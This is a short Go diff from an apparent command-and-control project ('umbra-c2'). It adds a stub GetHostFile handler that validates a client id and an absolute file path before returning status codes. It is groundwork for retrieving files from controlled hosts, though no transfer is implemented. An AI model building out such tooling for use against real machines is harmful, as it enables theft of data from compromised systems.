@@ -2,6 +2,7 @@ package routes
 
 import (
 	"net/http"
+	"path"
 	"umbra-c2/c2"
 
 	"github.com/gin-gonic/gin"
@@ -56,5 +57,27 @@ func GetHost(c *gin.Context) {
 }
 
 func GetHostFile(c *gin.Context) {
-	c.Status(http.StatusOK)
+	id, ok := c.MustGet("id").(uuid.UUID)
+
+	if !ok {
+		c.Status(http.StatusInternalServerError)
+		return
+	}
+
+	filePath, _ := c.GetQuery("path")
+
+	if filePath == "" {
+		c.Status(http.StatusBadRequest)
+		return
+	}
+
+	if path.IsAbs(filePath) {
+		if _, ok := c2.Clients[id]; ok {
+			c.Status(http.StatusOK)
+		} else {
+			c.Status(http.StatusNotFound)
+		}
+	} else {
+		c.Status(http.StatusBadRequest)
+	}
 }
